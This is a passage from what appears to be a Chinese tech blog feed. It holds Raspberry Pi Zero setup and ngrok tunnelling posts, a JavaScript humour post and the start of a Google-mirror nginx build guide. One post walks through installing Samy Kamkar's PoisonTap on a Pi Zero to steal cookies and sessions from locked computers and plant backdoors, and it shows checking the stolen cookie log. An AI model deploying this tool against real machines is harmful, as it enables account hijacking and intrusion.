<p>再对mac地址进行绑定，再进入vnc，试试看</p>
<p><img src="/content/images/zeronet/4.jpg" alt=""></p>
<p>哇 可以上网了！</p>
<p>然而悲痛的消息还有呢~</p>
<p>内网隔离</p>
<h2 id="ngrok-TCP转发"><a href="#ngrok-TCP转发" class="headerlink" title="ngrok TCP转发"></a>ngrok TCP转发</h2><p>这难不倒我，用ngrok就可以解决，正好身在墙外，更加方便。</p>
<p>下载ngrok<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip</div><div class="line">unzip ngrok-stable-linux-arm.zip</div></pre></td></tr></table></figure></p>
<p>配置开机启动项<code>vi /etc/rc.local</code><br>在exit 0 前面加入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/home/pi/ngrok authtoken 你的AUTO</div><div class="line">/home/pi/ngrok tcp 22</div></pre></td></tr></table></figure></p>
<p>搞定！拔掉USB HUB，关掉路由器，重启！</p>
<p>过了10分钟后，我们的树莓派上线了！</p>
<p><img src="/content/images/zeronet/5.png" alt=""></p>
<p>用ssh命令连接一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh pi@0.tcp.ngrok.io -p 13016</div></pre></td></tr></table></figure>
<p>连接速度超级快，如同本地一样，给ngrok官网点赞。</p>
<p><img src="/content/images/zeronet/6.jpg" alt=""></p>
<h2 id="lighttpd-部署"><a href="#lighttpd-部署" class="headerlink" title="lighttpd 部署"></a>lighttpd 部署</h2><p>总要搞点事情嘛，部署一个Web服务对于512MB的内存的树莓派Zero不过分吧。</p>
<p>那么什么Web服务最合适呢？脑海第一时间想到轻量级的lighttpd，ngnix我都嫌弃费资源，那么就它了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install -y lighttpd</div></pre></td></tr></table></figure>
<p>安装完成！目录在<code>/var/www/html</code></p>
<p>写好html，部署上去。</p>
<p>那么如何才能办到同时映射到两个端口呢？ngrok的官方文档有提示。</p>
<p><code>nano /home/pi/.ngrok2/ngrok.yml</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">authtoken: 你的AUTH</div><div class="line">region: eu</div><div class="line">json_resolver_url: &quot;&quot;</div><div class="line">dns_resolver_ips: []</div><div class="line"></div><div class="line">tunnels:</div><div class="line">  app-foo:</div><div class="line">    addr: 80</div><div class="line">    proto: http</div><div class="line">    host_header: app-foo.dev</div><div class="line">  app-bar:</div><div class="line">    addr: 22</div><div class="line">    proto: tcp</div><div class="line">    host_header: app-bar.dev</div></pre></td></tr></table></figure></p>
<p>这样就部署了两个服务，<code>app-foo</code>，<code>app-bar</code>，不错，开机再启动他们。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo nano /etc/rc.local</div></pre></td></tr></table></figure>
<p>把之前那句换成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/home/pi/proj/ngrok/ngrok start --config /home/pi/.ngrok2/ngrok.yml app-foo app-bar</div></pre></td></tr></table></figure></p>
<p>好了，剩下我们要做的就是重启与等待。</p>
<p><img src="/content/images/zeronet/7.jpg" alt=""></p>
<p>哈哈，上线了，访问一下。</p>
<p><img src="/content/images/zeronet/8.png" alt=""></p>
<p>这个只有4英镑的树莓派实现联网后花费了：</p>
<p>树莓派：4磅</p>
<p>OTG线：0.86磅</p>
<p>WIFI适配器：人民币25元</p>
<p>储存卡：9磅</p>
<p>谢谢<del>观看</del>忍耐全文。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;说句实话，Zero真的不适合把玩，想让他连上网，太难了。&lt;/p&gt;
&lt;h1 id=&quot;痛点&quot;&gt;&lt;a href=&quot;#痛点&quot; class=&quot;headerlink&quot; title=&quot;痛点&quot;&gt;&lt;/a&gt;痛点&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;住公寓，有WiFi/Lan登录认证系统&lt;/li&gt;
&lt;li
    
    </summary>
    
      <category term="Rasberry" scheme="http://blog.yfgeek.com/categories/Rasberry/"/>
    
    
      <category term="Raspberry" scheme="http://blog.yfgeek.com/tags/Raspberry/"/>
    
  </entry>
  
  <entry>
    <title>Wat 吐槽JavaScript</title>
    <link href="http://blog.yfgeek.com/2016/12/21/wat/"/>
    <id>http://blog.yfgeek.com/2016/12/21/wat/</id>
    <published>2016-12-21T01:17:26.000Z</published>
    <updated>2016-12-21T15:33:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天晚上在研究React技术栈头疼的时候，突然看到一个吐槽JavaScript的视频，简直搞笑，不过也挺客观的，毕竟是一个10天内攒出来的语言，虽然现在发展有ES支撑，但是依然非常零散，不过我按照视频里的做法试了一下，似乎有的返回结果不太一样。</p>
<h1 id="Wat"><a href="#Wat" class="headerlink" title="Wat"></a>Wat</h1><p><a href="https://www.destroyallsoftware.com/talks/wat" target="_blank" rel="external"><img src="https://www.destroyallsoftware.com/images/posters/talks/wat.poster.png" alt=""></a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">[] + []</div><div class="line"><span class="string">""</span></div><div class="line">[] + &#123;&#125;</div><div class="line"><span class="string">"[object Object]"</span></div><div class="line">&#123;&#125; + []</div><div class="line"><span class="number">0</span></div><div class="line">&#123;&#125; + &#123;&#125;</div><div class="line"><span class="string">"[object Object][object Object]"</span></div><div class="line"><span class="built_in">Array</span>(<span class="number">16</span>)</div><div class="line">[<span class="literal">undefined</span> × <span class="number">16</span>]</div><div class="line"><span class="built_in">Array</span>(<span class="number">16</span>).join(<span class="string">"wat"</span>)</div><div class="line"><span class="string">"watwatwatwatwatwatwatwatwatwatwatwatwatwatwat"</span></div><div class="line"><span class="built_in">Array</span>(<span class="number">16</span>).join(<span class="string">"wat"</span> - <span class="number">1</span> ) + <span class="string">" Batman!"</span></div><div class="line"><span class="string">"NaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaN Batman!"</span></div></pre></td></tr></table></figure>
<p>总之，看完这个视频，我就想说一句：</p>
<p><img src="/content/images/wat/1.jpg" alt=""></p>
<h1 id="Javascript的出生与死亡"><a href="#Javascript的出生与死亡" class="headerlink" title="Javascript的出生与死亡"></a>Javascript的出生与死亡</h1><p>此外还有另一个视频 对JS从1995-2035年的历史阐述及大胆预测。</p>
<p><a href="https://www.destroyallsoftware.com/talks/the-birth-and-death-of-javascript" target="_blank" rel="external"><img src="https://www.destroyallsoftware.com/images/posters/talks/the-birth-and-death-of-javascript.poster.png" alt=""></a></p>
<p>十分客观的罗列出了JS的缺点、当前JS发展趋势必然产生的低效率问题。</p>
<p><img src="/content/images/wat/2.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天晚上在研究React技术栈头疼的时候，突然看到一个吐槽JavaScript的视频，简直搞笑，不过也挺客观的，毕竟是一个10天内攒出来的语言，虽然现在发展有ES支撑，但是依然非常零散，不过我按照视频里的做法试了一下，似乎有的返回结果不太一样。&lt;/p&gt;
&lt;h1 id=&quot;Wa
    
    </summary>
    
      <category term="笑话" scheme="http://blog.yfgeek.com/categories/%E7%AC%91%E8%AF%9D/"/>
    
    
      <category term="Web" scheme="http://blog.yfgeek.com/tags/Web/"/>
    
      <category term="笑话" scheme="http://blog.yfgeek.com/tags/%E7%AC%91%E8%AF%9D/"/>
    
  </entry>
  
  <entry>
    <title>30秒内盗取任意PC的Cookie神器 PoisonTap</title>
    <link href="http://blog.yfgeek.com/2016/12/18/poisontap/"/>
    <id>http://blog.yfgeek.com/2016/12/18/poisontap/</id>
    <published>2016-12-18T18:44:51.000Z</published>
    <updated>2016-12-20T01:37:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>著名黑阔Samy Kamkar利用Raspberry Pi Zero黑客神器PoisonTap，只需30秒，就可以窃取有任意密码的电脑系统下的Cookie和Session，并实现长期后门安装。PoisonTap不是暴力破解密码，而是绕过密码。</p>
<p>是的，买了Raspberry Pi Zero，有幸尝试了一下这个基于Node的工具，真乃神器。</p>
<a id="more"></a>
<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>PoisonTap 通吃 Windows/Mac/Linux系统。其实现原理十分猥琐。</p>
<p><img src="/content/images/poisontap/1.gif" alt=""></p>
<p>把自己伪装成有线网卡，一旦插入系统中，众所周知，所有的操作系统的规则都是这样的：</p>
<blockquote>
<p>有线网络&gt;无线网络</p>
</blockquote>
<p>也就是说，如果他连接着Wi-Fi，没关系，系统会以我的伪网卡为最高优先级。在系统处于锁屏状态下，只要有网络通信，无论系统通信哪个都会被强制跳转到我用于 攻击你的页面 ，成批量的窃取你的Cookie和Session。</p>
<p>没错，就是你猜到的MITM，中间人攻击。通过PoisonTap，我们可以：</p>
<ul>
<li>模拟成一个伪USB网卡</li>
<li>不需要解锁电脑就可以实现攻击</li>
<li>劫持系统所有网络连接的所有流量 包括局域网</li>
<li>窃取储存Alexa前一百万的网站的Cookie和Session</li>
<li>用远程outbound的方式进行WebSocket或DNS重绑定攻击</li>
<li>用HTTP的JS缓存禁止对该PC进行web后门安装，缓存涉及到上千个域名和cdn js缓存供应商</li>
<li>截取Cookie后可以使用该PC的Cookie进行登录，实现中间人攻击的最终目标</li>
</ul>
<p><img src="/content/images/poisontap/2.gif" alt=""></p>
<p>PoisonTap比你想象的更强大的是，PoisonTap能够突破以下普通MITM办不到的几点：</p>
<ul>
<li>锁屏密码</li>
<li>路由表ARP的优先级设置和网络适配器优先级设置</li>
<li>同源策略 (Same-Origin Policy)</li>
<li>X-Frame-Options 响应头攻击</li>
<li>Cookie的HttpOnly安全设置</li>
<li>Cookie的SameSite安全属性</li>
<li>两步/多步验证密码(2FA/MFA)</li>
<li>DNS劫持</li>
<li>跨域资源共享CORS</li>
<li>HTTPS cookie 保护</li>
</ul>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>接着昨天的零网络配置，我们不需要任何网口 WiFi 蓝牙 就可以完成配置。</p>
<p>注意！配置前请保证<code>apt-get</code>命令是可以用的且可以联网的，配置过程中不允许出错，否则会出大问题。</p>
<p>首先，我们在本机下载下来这个神器Poisontap</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/samyk/poisontap</div></pre></td></tr></table></figure>
<p>然后，我们用scp命令把Poisontap传到Raspberry Pi Zero上。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scp -r poisontap pi@zero.local:~</div></pre></td></tr></table></figure></p>
<p>登录到树莓派上，运行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> poisontap</div><div class="line"><span class="built_in">echo</span> <span class="_">-e</span> <span class="string">"\nauto usb0\nallow-hotplug usb0\niface usb0 inet static\n\taddress 1.0.0.1\n\tnetmask 0.0.0.0"</span> &gt;&gt; /etc/network/interfaces</div><div class="line"><span class="built_in">echo</span> <span class="string">"dtoverlay=dwc2"</span> &gt;&gt; /boot/config.txt</div><div class="line"><span class="built_in">echo</span> <span class="_">-e</span> <span class="string">"dwc2\ng_ether"</span> &gt;&gt; /etc/modules</div><div class="line">sudo sed --in-place <span class="string">"/exit 0/d"</span> /etc/rc.local</div><div class="line"><span class="built_in">echo</span> <span class="string">"/bin/sh /home/pi/poisontap/pi_startup.sh"</span> &gt;&gt; /etc/rc.local</div><div class="line">mkdir /home/pi/poisontap</div><div class="line">chown -R pi /home/pi/poisontap</div><div class="line">apt-get update &amp;&amp; apt-get upgrade</div><div class="line">apt-get -y install isc-dhcp-server dsniff screen nodejs</div></pre></td></tr></table></figure></p>
<p>确保以上都成功后，运行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo cp dhcpd.conf /etc/dhcp/dhcpd.conf</div><div class="line">reboot</div></pre></td></tr></table></figure></p>
<p>好了，已经安装好了，接下来我们可以Hack啦~</p>
<h1 id="Hack"><a href="#Hack" class="headerlink" title="Hack"></a>Hack</h1><h2 id="Cookie-和-Session窃取"><a href="#Cookie-和-Session窃取" class="headerlink" title="Cookie 和 Session窃取"></a>Cookie 和 Session窃取</h2><p>把配置好的树莓派重新插入电脑里，这时他已经变成了黑阔神器了。</p>
<p>为了使攻击过程可视化，我们访问 www.google.com</p>
<p><img src="/content/images/poisontap/4.png" alt=""></p>
<p>动画非常炫酷，这时候已经在窃取成千上万的网站的Cookie了，吃个小饼干。</p>
<p><img src="/content/images/poisontap/5.png" alt=""></p>
<p>打开Chrome的工具看一看，哇。</p>
<p>随后，Cookie都被保存在树莓派里了，我们连接上树莓派的SSH，看一下，成功。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat poisontap.cookies.log</div></pre></td></tr></table></figure>
<p><img src="/content/images/poisontap/3.png" alt=""></p>
<h2 id="伪造网站"><a href="#伪造网站" class="headerlink" title="伪造网站"></a>伪造网站</h2><h2 id="远程后门"><a href="#远程后门" class="headerlink" title="远程后门"></a>远程后门</h2><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/samyk/poisontap" target="_blank" rel="external">https://github.com/samyk/poisontap</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;著名黑阔Samy Kamkar利用Raspberry Pi Zero黑客神器PoisonTap，只需30秒，就可以窃取有任意密码的电脑系统下的Cookie和Session，并实现长期后门安装。PoisonTap不是暴力破解密码，而是绕过密码。&lt;/p&gt;
&lt;p&gt;是的，买了Raspberry Pi Zero，有幸尝试了一下这个基于Node的工具，真乃神器。&lt;/p&gt;
    
    </summary>
    
      <category term="Hack" scheme="http://blog.yfgeek.com/categories/Hack/"/>
    
    
      <category term="Hack" scheme="http://blog.yfgeek.com/tags/Hack/"/>
    
  </entry>
  
  <entry>
    <title>Raspberry Pi Zero 无需键盘网络 配置教程</title>
    <link href="http://blog.yfgeek.com/2016/12/17/raspizero/"/>
    <id>http://blog.yfgeek.com/2016/12/17/raspizero/</id>
    <published>2016-12-17T21:58:26.000Z</published>
    <updated>2016-12-18T03:42:49.000Z</updated>
    
    <content type="html"><![CDATA[<p>我大概是个Raspberry Pi粉丝，到了英国后总感觉不买点树莓派的东西亏，可是之前已经在中国买了树莓派3了，于是决定买点特别的，做点有意思的事情。</p>
<p>上个月，鉴于我在英国的巨大地理优势的缘故，买了一个4磅的Raspberry Pi Zero，不过网络上关于树莓派Zero的文章真的甚少，因为实在太难原价买到了。</p>
<a id="more"></a> 
<p>请注意，不要认为所谓的4磅很便宜，毕竟，我还多掏了2.50磅的邮费。树莓派Zero在中国并不便宜，因为树莓派Zero的产能有限，每周只能供很少的货，买树莓派Zero就像抢12306一样，我抢了两周，也正是因为这个原因，树莓派Zero在亚马逊的黄牛卖家卖20磅，淘宝卖120元左右，实际上原价只有40元左右。</p>
<h1 id="信仰充值"><a href="#信仰充值" class="headerlink" title="信仰充值"></a>信仰充值</h1><p>滴！信仰充值成功！</p>
<p><img src="/content/images/raspizero/mail.jpg" alt=""></p>
<p>没有错，你没有看错，就是这么小，但是小也有小的坏处，没有USB口，没有Wi-Fi，没有网线接口，似乎什么都没有用。</p>
<ul>
<li>1Ghz, Single-core CPU</li>
<li>512MB RAM</li>
<li>Mini HDMI and USB On-The-Go ports</li>
<li>Micro USB power</li>
<li>HAT-compatible 40-pin header</li>
<li>Composite video and reset headers</li>
</ul>
<p>不过值得一提的是，USB On-The-Go接口也可以用来供电。</p>
<h1 id="发车"><a href="#发车" class="headerlink" title="发车"></a>发车</h1><p>网络上关于树莓派Zero如何连接配置大概有以下几种：</p>
<ul>
<li>OTG口转USB 接 USB以太网适配器</li>
<li>OTG口转USB 接 USB Wi-Fi</li>
<li>OTG口转USB 接 USB键盘 且 用HDMI接显示器</li>
<li>GPIO接以太网适配器</li>
</ul>
<p>但是以上，都太麻烦了，对不对？</p>
<p>那么关键问题就来了，如何才能在 没有网口、没有Wi-Fi、没有显示器、没有鼠标、没有键盘的情况下 配置可爱的树莓派Zero呢？</p>
<p>我们 可以 把 树莓派 虚拟为 网卡，然后在内网连接它。</p>
<p>1.下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，并且刷到你的SD Card里，Windows用Win32 Disk Imager， Mac/Linux 用命令，如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">diskutil list</div><div class="line">diskutil unmountDisk /dev/SD卡的标号 <span class="comment">#如disk2</span></div><div class="line"><span class="built_in">cd</span> /Users/ivan/Downloads/2016-11-25-raspbian-jessie <span class="comment">#进入目录</span></div><div class="line">sudo dd bs=1m <span class="keyword">if</span>=2016-11-25-raspbian-jessie.img of=/dev/rdisk2</div></pre></td></tr></table></figure>
<p>2.刷好系统后编辑<code>config.txt</code>文件，在最后一行下，另起一行添加：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dtoverlay=dwc2</div></pre></td></tr></table></figure></p>
<p>保存文件</p>
<p>3.最后，打开<code>cmdline.txt</code>文件。<br>找到单词<code>rootwait</code>，在其之后添加：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">modules-load=dwc2,g_ether</div></pre></td></tr></table></figure>
<p>4.添加一个文件名为<code>ssh</code>到根目录下，内容为空</p>
<p>5.把SD Card放到树莓派Zero，用安卓数据线与电脑连接，USB口接OTG口，等待60-90s，电脑会发现网卡并且自动配置ip地址。</p>
<p><img src="/content/images/raspizero/1.png" alt=""></p>
<p>6.Ping 一下raspberrypi.local看是否能通</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">PING raspberrypi.local (169.254.70.245): 56 data bytes</div><div class="line">64 bytes from 169.254.70.245: icmp_seq=0 ttl=64 time=0.570 ms</div><div class="line">64 bytes from 169.254.70.245: icmp_seq=1 ttl=64 time=0.338 ms</div><div class="line">64 bytes from 169.254.70.245: icmp_seq=2 ttl=64 time=0.316 ms</div><div class="line">64 bytes from 169.254.70.245: icmp_seq=3 ttl=64 time=0.344 ms</div></pre></td></tr></table></figure>
<p>7.ssh连接raspberrypi.local，默认密码为raspberry<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pi@raspberrypi.local</div></pre></td></tr></table></figure></p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>因为没有网络，只能通过下载离线安装文件，传输到树莓派内，再在树莓派里安装。</p>
<h2 id="配置树莓派"><a href="#配置树莓派" class="headerlink" title="配置树莓派"></a>配置树莓派</h2><p>通过直接运行<code>raspi-config</code>命令</p>
<p>你需要做</p>
<ul>
<li>容量扩展</li>
<li>更改系统时区</li>
<li>更改系统密码</li>
</ul>
<p>同时你需要通过执行<code>sudo passwd root</code>更改root密码</p>
<h2 id="安装vnc-server"><a href="#安装vnc-server" class="headerlink" title="安装vnc-server"></a>安装vnc-server</h2><p>首先，去<a href="https://www.realvnc.com/download/vnc/raspberrypi/" target="_blank" rel="external">VNC官网</a>下载最新版本的vnc-server</p>
<p>用scp命令传到树莓派上</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scp /Users/ivan/Downloads/VNC-5.3.2-Linux-ARM-DEB.tar.gz  pi@raspberrypi.local:~</div></pre></td></tr></table></figure>
<p>在树莓派shell下，安装VNC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">tar xvf VNC-5.3.2-Linux-ARM-DEB.tar.gz</div><div class="line">sudo dpkg -i VNC-Server-5.3.2-Linux-ARM.deb</div></pre></td></tr></table></figure></p>
<p><img src="/content/images/raspizero/2.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">vncpasswd -user  # 设置连接密码</div><div class="line">vncserver  # 启动vncserver</div></pre></td></tr></table></figure>
<p>连接raspberry.local:1测试成功</p>
<p><img src="/content/images/raspizero/3.png" alt=""></p>
<h2 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h2><p>本来想着，既然把它虚拟为网卡了，能否NAT网络给他让他上网？事实上，是失败的。</p>
<p>那么我们有一个临时解决方案，就是设置代理</p>
<p>首先，在本机搭建一个squid</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">brew update</div><div class="line">brew install squid</div></pre></td></tr></table></figure>
<p>然后下载<a href="http://squidman.net/squidman/" target="_blank" rel="external">SquidMan</a>，安装。<br>在本机开启端口为8080的HTTP代理服务，并把本机名称更为Mac。</p>
<p>进入树莓派shell，输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /etc/apt/apt.conf.d</div><div class="line">sudo vi /etc/apt/apt.conf.d</div></pre></td></tr></table></figure></p>
<p>最后一行加入一句话：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Acquire::http::Proxy &quot;http://Mac.local:8080&quot;;</div></pre></td></tr></table></figure></p>
<p>保存</p>
<p>apt-get update一下，怎么样是不是能装软件了？</p>
<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>这块小板子，我太喜欢了，好精致</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://gist.github.com/gbaman/975e2db164b3ca2b51ae11e45e8fd40a#file-howtootgfast-md" target="_blank" rel="external">https://gist.github.com/gbaman/975e2db164b3ca2b51ae11e45e8fd40a#file-howtootgfast-md</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我大概是个Raspberry Pi粉丝，到了英国后总感觉不买点树莓派的东西亏，可是之前已经在中国买了树莓派3了，于是决定买点特别的，做点有意思的事情。&lt;/p&gt;
&lt;p&gt;上个月，鉴于我在英国的巨大地理优势的缘故，买了一个4磅的Raspberry Pi Zero，不过网络上关于树莓派Zero的文章真的甚少，因为实在太难原价买到了。&lt;/p&gt;
    
    </summary>
    
      <category term="Raspberry" scheme="http://blog.yfgeek.com/categories/Raspberry/"/>
    
    
      <category term="Raspberry" scheme="http://blog.yfgeek.com/tags/Raspberry/"/>
    
  </entry>
  
  <entry>
    <title>Google镜像站的搭建</title>
    <link href="http://blog.yfgeek.com/2016/12/11/Google%E9%95%9C%E5%83%8F%E7%AB%99%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>http://blog.yfgeek.com/2016/12/11/Google镜像站的搭建/</id>
    <published>2016-12-11T19:21:59.000Z</published>
    <updated>2016-12-11T19:30:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>前两天，Google开发者大会高调的宣布Google Developers 网站终于正式上线了，希望Google能够解决一切问题，早日回归大陆市场。</p>
<a id="more"></a>
<h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Centos 6 </p>
<h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><ol>
<li>nginx</li>
<li>pcre 正则</li>
<li>ngx_http_proxy_module 反向代理</li>
<li>ngx_http_substitutions_filter_module 多重替换</li>
</ol>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 安装 gcc &amp; git</span></div><div class="line"><span class="comment">#</span></div><div class="line">apt-get install build-essential git gcc g++ make</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 下载最新版源码</span></div><div class="line"><span class="comment"># nginx 官网: </span></div><div class="line"><span class="comment"># http://nginx.org/en/download.html</span></div><div class="line"><span class="comment">#</span></div><div class="line">wget <span class="string">"http://nginx.org/download/nginx-1.7.8.tar.gz"</span></div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 下载最新版 pcre</span></div><div class="line"><span class="comment"># pcre 官网:</span></div><div class="line"><span class="comment"># http://www.pcre.org/</span></div><div class="line"><span class="comment">#</span></div><div class="line">wget <span class="string">"ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.38.tar.gz"</span></div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 下载最新版 openssl</span></div><div class="line"><span class="comment"># opessl 官网:</span></div><div class="line"><span class="comment"># https://www.openssl.org/</span></div><div class="line"><span class="comment">#</span></div><div class="line">wget <span class="string">"https://www.openssl.org/source/openssl-1.0.1j.tar.gz"</span></div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 下载最新版 zlib</span></div><div class="line"><span class="comment"># zlib 官网:</span></div><div class="line"><span class="comment"># http://www.zlib.net/</span></div><div class="line"><span class="comment">#</span></div><div class="line">wget <span class="string">"http://zlib.net/zlib-1.2.8.tar.gz"</span></div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 下载本扩展</span></div><div class="line"><span class="comment">#</span></div><div class="line">git <span class="built_in">clone</span> https://github.com/cuber/ngx_http_google_filter_module</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 下载 substitutions 扩展</span></div><div class="line"><span class="comment">#</span></div><div class="line">git <span class="built_in">clone</span> https://github.com/yaoweibin/ngx_http_substitutions_filter_module</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 解压缩</span></div><div class="line"><span class="comment">#</span></div><div class="line">tar xzvf nginx-1.7.8.tar.gz</div><div class="line">tar xzvf pcre-8.38.tar.gz</div><div class="line">tar xzvf openssl-1.0.1j.tar.gz</div><div class="line">tar xzvf zlib-1.2.8.tar.gz</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 进入 nginx 源码目录</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="built_in">cd</span> nginx-1.7.8</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 设置编译选项</span></div><div class="line"><span class="comment">#</span></div><div class="line">./configure \</div><div class="line">  --prefix=/opt/nginx-1.7.8 \</div><div class="line">  --with-pcre=../pcre-8.38 \</div><div class="line">  --with-openssl=../openssl-1.0.1j \</div><div class="line">  --with-zlib=../zlib-1.2.8 \</div><div class="line">  --with-http_ssl_module \</div><div class="line">  --add-module=../ngx_http_google_filter_module \</div><div class="line">  --add-module=../ngx_http_substitutions_filter_module</div><div 